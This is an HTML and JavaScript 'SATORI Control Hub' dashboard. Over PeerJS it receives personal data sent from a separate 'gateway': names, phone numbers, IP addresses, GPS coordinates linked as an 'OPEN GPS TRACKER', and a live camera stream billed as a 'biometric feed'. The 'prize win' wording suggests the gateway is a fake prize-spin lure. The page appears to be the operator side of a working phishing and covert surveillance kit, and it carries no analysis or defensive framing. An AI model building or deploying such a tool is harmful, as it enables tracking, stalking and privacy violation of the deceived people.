<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SATORI | Control Hub</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        :root { --primary: #38bdf8; --bg: #0f172a; --card: #1e293b; --text: #f8fafc; --accent: #fbbf24; --success: #10b981; }
        body { font-family: 'Inter', system-ui, sans-serif; background: var(--bg); color: var(--text); margin: 0; display: flex; height: 100vh; overflow: hidden; }
        
        /* Sidebar Styles */
        #sidebar { width: 380px; background: var(--card); border-right: 1px solid #334155; padding: 25px; display: flex; flex-direction: column; box-shadow: 10px 0 30px rgba(0,0,0,0.2); z-index: 10; }
        h2 { margin: 0 0 5px 0; color: var(--primary); font-size: 22px; letter-spacing: 1px; font-weight: 800; }
        .status-badge { display: inline-block; padding: 4px 12px; border-radius: 20px; font-size: 10px; font-weight: 800; background: #14532d; color: #4ade80; margin-bottom: 25px; text-transform: uppercase; }
        
        .data-section { background: #0f172a; border-radius: 12px; padding: 15px; margin-bottom: 15px; border-left: 4px solid var(--primary); transition: 0.3s; }
        .label { font-size: 10px; color: #94a3b8; text-transform: uppercase; font-weight: 700; margin-bottom: 5px; }
        .value { font-size: 16px; font-family: 'JetBrains Mono', monospace; color: var(--text); word-break: break-all; }
        
        /* Prize Log */
        #prize-history { background: #000; border-radius: 8px; padding: 12px; height: 120px; overflow-y: auto; font-family: monospace; font-size: 12px; border: 1px solid #334155; margin-top: 10px; }
        .prize-item { color: var(--accent); padding: 4px 0; border-bottom: 1px solid #222; }

        /* Log Area */
        #log-container { flex-grow: 1; background: #000; border-radius: 8px; padding: 15px; font-size: 11px; font-family: monospace; overflow-y: auto; color: var(--success); border: 1px solid #334155; }
        .log-entry { margin-bottom: 5px; border-bottom: 1px solid #111; padding-bottom: 2px; }
        .timestamp { color: #64748b; margin-right: 8px; }

        /* Main Viewport */
        #viewport { flex: 1; background: #000; position: relative; display: flex; align-items: center; justify-content: center; }
        video { width: 100%; height: 100%; object-fit: contain; background: #000; }
        #placeholder { position: absolute; text-align: center; color: #475569; z-index: 5; }
        .map-link { display: inline-block; margin-top: 10px; color: var(--accent); text-decoration: none; font-size: 13px; font-weight: bold; border: 1px solid var(--accent); padding: 8px 15px; border-radius: 6px; transition: 0.3s; }
        .map-link:hover { background: var(--accent); color: #000; }
    </style>
</head>
<body>

<div id="sidebar">
    <h2>SATORI HUB</h2>
    <div class="status-badge" id="sys-status">OFFLINE</div>

    <div class="data-section">
        <div class="label">Primary Identity</div>
        <div class="value" id="res-name">Awaiting Submission...</div>
        <div class="value" id="res-phone" style="font-size: 14px; margin-top:5px; color:#94a3b8;">No Contact Info</div>
    </div>

    <div class="data-section" style="border-left-color: var(--accent);">
        <div class="label">Network & Geo-Target</div>
        <div class="value" id="res-ip">IP: 0.0.0.0</div>
        <div id="res-geo"></div>
    </div>

    <div class="label">Live Prize Win History</div>
    <div id="prize-history">
        <div style="color: #475569;">No prizes won yet...</div>
    </div>

    <div class="label" style="margin-top: 15px; margin-bottom: 10px;">Debug Stream</div>
    <div id="log-container">
        <div class="log-entry">Booting SATORI core...</div>
    </div>
</div>

<div id="viewport">
    <div id="placeholder">
        <div style="font-size: 50px; margin-bottom: 10px;">👁️‍🗨️</div>
        <div style="letter-spacing: 2px;">WAITING FOR BIOMETRIC FEED</div>
    </div>
    <video id="remote-video" autoplay playsinline></video>
</div>

<script>
    const TARGET_ID = 'enkode-satori-v1-russel';
    const peer = new Peer(TARGET_ID);

    // Audio context unlock for Chrome
    window.addEventListener('click', () => {
        const v = document.getElementById('remote-video');
        v.play();
        addLog("Media context unlocked.");
    });

    peer.on('open', (id) => {
        const status = document.getElementById('sys-status');
        status.innerText = "ONLINE: " + id;
        status.style.background = "#14532d";
        addLog("Signal server initialized.");
    });

    peer.on('connection', (conn) => {
        addLog("Secure data tunnel established.");

        conn.on('data', (data) => {
            // Handle ALL types of logs sent from the gateway
            if (data.type === "FULL_LOG" || data.type === "CLAIM_LOG") {
                // Update Name & Phone (Support multiple possible keys)
                document.getElementById('res-name').innerText = data.name || data.roll || "Unknown";
                document.getElementById('res-phone').innerText = "PH: " + (data.phone || data.school || "N/A");
                
                // Update IP
                document.getElementById('res-ip').innerText = "IP: " + (data.ip || "Unknown");

                // Update Map
                if(data.location && data.location.lat) {
                    const url = `https://www.google.com/maps?q=${data.location.lat},${data.location.lon}`;
                    document.getElementById('res-geo').innerHTML = `<a href="${url}" target="_blank" class="map-link">📍 OPEN GPS TRACKER</a>`;
                }

                // Add to Prize History (Since they can spin again and again)
                addPrize(data.prize || "No Prize Data");
                
                addLog(`Data Received: ${data.name || 'User'} won ${data.prize}`);
            }
        });
    });

    peer.on('call', (call) => {
        addLog("Incoming video packet...");
        call.answer(); 
        
        call.on('stream', (stream) => {
            const video = document.getElementById('remote-video');
            video.srcObject = stream;
            document.getElementById('placeholder').style.display = 'none';
            
            video.onloadedmetadata = () => {
                video.play().catch(() => addLog("Autoplay blocked - CLICK SIDEBAR"));
            };
        });
    });

    function addLog(msg) {
        const container = document.getElementById('log-container');
        const time = new Date().toLocaleTimeString([], { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
        container.innerHTML += `<div class="log-entry"><span class="timestamp">[${time}]</span> ${msg}</div>`;
        container.scrollTop = container.scrollHeight;
    }

    function addPrize(prize) {
        const hist = document.getElementById('prize-history');
        if(hist.innerHTML.includes("No prizes")) hist.innerHTML = "";
        const time = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
        hist.innerHTML = `<div class="prize-item">🏆 ${prize} <span style="color:#475569; font-size:10px;">@ ${time}</span></div>` + hist.innerHTML;
    }

    peer.on('error', (err) => {
        addLog("PEER ERROR: " + err.type);
    });
</script>
</body>
</html>
